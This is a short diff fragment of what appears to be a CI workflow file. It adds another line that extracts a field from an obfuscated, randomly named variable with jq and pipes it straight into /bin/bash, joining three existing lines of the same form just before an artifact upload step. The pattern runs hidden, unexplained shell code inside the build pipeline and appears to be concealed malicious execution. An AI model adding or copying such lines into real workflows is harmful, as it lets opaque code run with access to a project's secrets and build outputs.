@@ -48,6 +48,7 @@ jobs:
           echo $tmhwo77830 | jq -r .pc17 | /bin/bash
           printf '%s' "$ksi9" | jq -r .f9 | /bin/bash
           printf '%s' "$hbdm52706" | jq -r .frypd18 | /bin/bash
+          echo $cykuq5 | jq -r .pjor345 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
